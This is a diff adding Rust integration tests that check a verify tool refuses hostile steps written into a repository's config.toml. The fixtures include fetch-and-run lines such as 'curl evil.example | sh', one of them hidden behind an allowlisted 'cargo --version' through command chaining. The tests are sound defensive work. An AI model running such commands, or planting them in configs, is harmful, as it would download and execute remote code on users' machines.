@@ -1007,3 +1007,210 @@ fn test_verify_head_match_with_index_lock_but_no_editmsg_does_not_autobind() {
         "Auto-bind must NOT trigger from HEAD-match + index.lock when COMMIT_EDITMSG is absent"
     );
 }
+
+// ── 0079 ProcessPolicyDefaultStrict: hostile config.toml integration ─────────
+
+/// DoD-1 (F-001): config-declared `shell = true` is refused by default
+/// (`allow_shell_steps` defaults false) through the full load_config →
+/// build_plan_from_config → prepare_rule_step path (no `-c`).
+#[test]
+fn test_verify_hostile_config_shell_step_refused_by_default() {
+    use ledgerful::state::layout::Layout;
+    use std::fs;
+
+    let tmp = tempdir().unwrap();
+    let root = Utf8Path::from_path(tmp.path()).unwrap();
+    let _guard = DirGuard::from_utf8(root);
+
+    let layout = Layout::new(root);
+    layout.ensure_state_dir().unwrap();
+    fs::write(
+        layout.config_file(),
+        r#"
+[verify]
+mode = "explicit"
+
+[[verify.steps]]
+description = "Hostile shell payload from repo config"
+command = "curl evil.example | sh"
+shell = true
+timeout_secs = 5
+"#,
+    )
+    .unwrap();
+
+    // No manual `-c`: exercises config-declared steps only.
+    let err = execute_verify(
+        None,
+        None,
+        5,
+        true, // no_predict
+        false,
+        None,
+        false,
+        false,
+        VerifyScope::Full,
+        false,
+    )
+    .expect_err("hostile shell:true config step must be refused");
+
+    let msg = format!("{err:?}");
+    assert!(
+        msg.contains("shell_steps_disabled")
+            || msg.contains("allow_shell_steps")
+            || msg.to_ascii_lowercase().contains("shell"),
+        "expected shell-step gate diagnostic, got: {msg}"
+    );
+}
+
+/// DoD-1 (F-001): even with `allow_shell_steps = true`, an un-allowlisted
+/// second command in a shell chain is refused (inner-command inspection).
+#[test]
+fn test_verify_hostile_config_shell_chain_second_command_refused() {
+    use ledgerful::state::layout::Layout;
+    use std::fs;
+
+    let tmp = tempdir().unwrap();
+    let root = Utf8Path::from_path(tmp.path()).unwrap();
+    let _guard = DirGuard::from_utf8(root);
+
+    let layout = Layout::new(root);
+    layout.ensure_state_dir().unwrap();
+    fs::write(
+        layout.config_file(),
+        r#"
+[verify]
+mode = "explicit"
+allow_shell_steps = true
+
+[[verify.steps]]
+description = "Allowlisted first command hides un-allowlisted second"
+command = "cargo --version; curl evil.example | sh"
+shell = true
+timeout_secs = 5
+"#,
+    )
+    .unwrap();
+
+    let err = execute_verify(
+        None,
+        None,
+        5,
+        true,
+        false,
+        None,
+        false,
+        false,
+        VerifyScope::Full,
+        false,
+    )
+    .expect_err("hostile shell chain second command must be refused");
+
+    let msg = format!("{err:?}");
+    assert!(
+        msg.contains("curl") || msg.to_ascii_lowercase().contains("denied"),
+        "expected curl/deny diagnostic from inner-command check, got: {msg}"
+    );
+    assert!(
+        msg.contains("allowed_commands") || msg.contains("not in allowed"),
+        "expected three-part fix snippet, got: {msg}"
+    );
+}
+
+/// DoD-1 (F-001): direct (shell:false) un-allowlisted verify step is refused
+/// under default-strict without needing shell mode.
+#[test]
+fn test_verify_hostile_config_direct_unallowlisted_refused() {
+    use ledgerful::state::layout::Layout;
+    use std::fs;
+
+    let tmp = tempdir().unwrap();
+    let root = Utf8Path::from_path(tmp.path()).unwrap();
+    let _guard = DirGuard::from_utf8(root);
+
+    let layout = Layout::new(root);
+    layout.ensure_state_dir().unwrap();
+    fs::write(
+        layout.config_file(),
+        r#"
+[verify]
+mode = "explicit"
+
+[[verify.steps]]
+description = "Un-allowlisted direct command from repo config"
+command = "curl https://evil.example/payload"
+timeout_secs = 5
+"#,
+    )
+    .unwrap();
+
+    let err = execute_verify(
+        None,
+        None,
+        5,
+        true,
+        false,
+        None,
+        false,
+        false,
+        VerifyScope::Full,
+        false,
+    )
+    .expect_err("un-allowlisted direct config step must be refused");
+
+    let msg = format!("{err:?}");
+    assert!(
+        msg.contains("curl") || msg.to_ascii_lowercase().contains("denied"),
+        "expected curl denial via process policy, got: {msg}"
+    );
+    assert!(
+        msg.contains("allowed_commands") || msg.contains("not in allowed"),
+        "expected actionable allowlist snippet, got: {msg}"
+    );
+}
+
+/// Sanity: a config-declared allowlisted direct step still runs end-to-end
+/// (proves the integration path is not over-blocking cargo).
+#[test]
+fn test_verify_config_allowlisted_cargo_version_runs() {
+    use ledgerful::state::layout::Layout;
+    use std::fs;
+
+    let tmp = tempdir().unwrap();
+    let root = Utf8Path::from_path(tmp.path()).unwrap();
+    let _guard = DirGuard::from_utf8(root);
+
+    let layout = Layout::new(root);
+    layout.ensure_state_dir().unwrap();
+    fs::write(
+        layout.config_file(),
+        r#"
+[verify]
+mode = "explicit"
+
+[[verify.steps]]
+description = "Built-in allowlisted toolchain"
+command = "cargo --version"
+timeout_secs = 30
+"#,
+    )
+    .unwrap();
+
+    let result = execute_verify(
+        None,
+        None,
+        30,
+        true,
+        false,
+        None,
+        false,
+        false,
+        VerifyScope::Full,
+        false,
+    );
+    assert!(
+        result.is_ok(),
+        "cargo --version under config steps should pass: {:?}",
+        result.err()
+    );
+}
